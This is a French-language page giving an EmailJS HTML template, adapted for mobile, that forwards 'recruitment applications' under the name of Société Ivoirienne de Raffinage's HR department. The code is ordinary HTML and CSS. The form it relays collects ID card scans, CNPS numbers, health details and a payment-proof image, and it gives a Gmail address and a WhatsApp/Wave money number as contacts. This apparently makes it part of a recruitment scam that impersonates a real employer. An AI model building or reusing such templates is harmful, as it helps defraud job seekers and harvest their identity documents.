# TEMPLATE EMAILJS MODIFIÉ POUR MOBILE

## Copiez-collez ce code dans votre template EmailJS :

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nouvelle candidature Société Ivoirienne de Raffinage</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            line-height: 1.4; 
            color: #333; 
            max-width: 100%; 
            margin: 0 auto; 
            padding: 10px;
            background: #f5f5f5;
        }
        .header { 
            background: #1e40af; 
            color: white; 
            padding: 15px; 
            text-align: center; 
            border-radius: 8px 8px 0 0;
        }
        .content { 
            padding: 15px; 
            background: #fff; 
            border: 1px solid #ddd; 
            border-top: none;
        }
        .section { 
            margin-bottom: 15px; 
            padding-bottom: 10px; 
            border-bottom: 1px solid #eee;
        }
        .section:last-child {
            border-bottom: none;
        }
        .label { 
            font-weight: bold; 
            color: #1e40af; 
            display: block; 
            margin-bottom: 3px; 
            font-size: 13px;
        }
        .value { 
            color: #374151; 
            margin-left: 5px; 
            font-size: 13px;
        }
        .footer { 
            background: #f8f9fa; 
            padding: 15px; 
            text-align: center; 
            font-size: 11px; 
            color: #666;
            border: 1px solid #ddd;
            border-top: none;
        }
        h3 { 
            color: #1e40af; 
            margin-bottom: 8px; 
            font-size: 16px;
        }
        h4 { 
            color: #374151; 
            margin-bottom: 10px; 
            font-size: 14px;
        }
        h1 { 
            margin: 0; 
            font-size: 18px;
        }
        h2 { 
            margin: 5px 0; 
            font-size: 14px;
        }
        img { 
            max-width: 100%; 
            max-height: 200px; 
            height: auto; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
            margin-top: 8px;
            display: block;
        }
        .image-container {
            text-align: center;
            margin: 10px 0;
            background: #f9f9f9;
            padding: 8px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Société Ivoirienne de Raffinage</h1>
        <h2>Direction des Ressources Humaines</h2>
        <p>Campagne de recrutement 2026</p>
    </div>

    <div class="content">
        <h3>NOUVELLE CANDIDATURE REÇUE</h3>
        <p><strong>Date de soumission :</strong> {{submission_date}}</p>

        <div class="section">
            <h4>INFORMATIONS D'IDENTITÉ</h4>
            <span class="label">ID Employé :</span> <span class="value">{{employee_id}}</span><br>
            <span class="label">Nom complet :</span> <span class="value">{{from_name}}</span><br>
            <span class="label">Nom de famille :</span> <span class="value">{{full_name}}</span><br>
            <span class="label">Prénom :</span> <span class="value">{{first_name}}</span><br>
            <span class="label">Téléphone :</span> <span class="value">{{phone}}</span>
        </div>

        <div class="section">
            <h4>CONTACT D'URGENCE</h4>
            <span class="label">Nom :</span> <span class="value">{{emergency_name}}</span><br>
            <span class="label">Téléphone :</span> <span class="value">{{emergency_phone}}</span>
        </div>

        <div class="section">
            <h4>DISPONIBILITÉ ET SANTÉ</h4>
            <span class="label">Problème de santé :</span> <span class="value">{{health_issue}}</span><br>
            <span class="label">Date de disponibilité :</span> <span class="value">{{availability_date}}</span>
        </div>

        <div class="section">
            <h4>INFORMATIONS CNPS</h4>
            <span class="label">Carte CNPS :</span> <span class="value">{{has_cnps}}</span><br>
            <span class="label">Numéro CNPS :</span> <span class="value">{{cnps_number}}</span><br>
            <span class="label">Preuve de paiement :</span> <span class="value">{{cnps_proof_name}}</span>
            
            <div class="image-container">
                <img src="{{cnps_proof_base64}}" alt="Preuve de paiement CNPS" />
            </div>
        </div>

        <div class="section">
            <h4>CARTE D'IDENTITÉ</h4>
            <span class="label">Pièce d'identité :</span> <span class="value">{{identity_card_name}}</span>
            
            <div class="image-container">
                <img src="{{identity_card_base64}}" alt="Carte d'identité" />
            </div>
        </div>

        <div class="section">
            <h4>ENGAGEMENT ET VALIDATION</h4>
            <span class="label">Confirmation exactitude :</span> <span class="value">{{confirm_accuracy}}</span><br>
            <span class="label">Acceptation CGU :</span> <span class="value">{{accept_terms}}</span>
        </div>

        <div class="section">
            <h4>INFORMATIONS DE CONTACT</h4>
            <p>Pour toute question concernant cette candidature :</p>
            <p> Email : <strong>supportrecrut@gmail.com</strong></p>
            <p> WhatsApp/Wave : <strong>2250767554748</strong></p>
        </div>
    </div>

    <div class="footer">
        <p>Ce message a été envoyé automatiquement depuis le formulaire de recrutement de la Société Ivoirienne de Raffinage.</p>
        <p>Direction des Ressources Humaines - République de Côte d'Ivoire</p>
    </div>
</body>
</html>
```

## Modifications apportées pour mobile :

1. **Viewport meta tag** pour adaptation mobile
2. **max-width: 100%** pour responsive
3. **Images plus petites** : max-height: 200px
4. **Polices réduites** pour mobile
5. **Padding réduit** pour petits écrans
6. **Containers d'images** avec background
7. **Balises `<br>`** au lieu de paragraphes pour économiser l'espace

Copiez ce code dans votre template EmailJS !
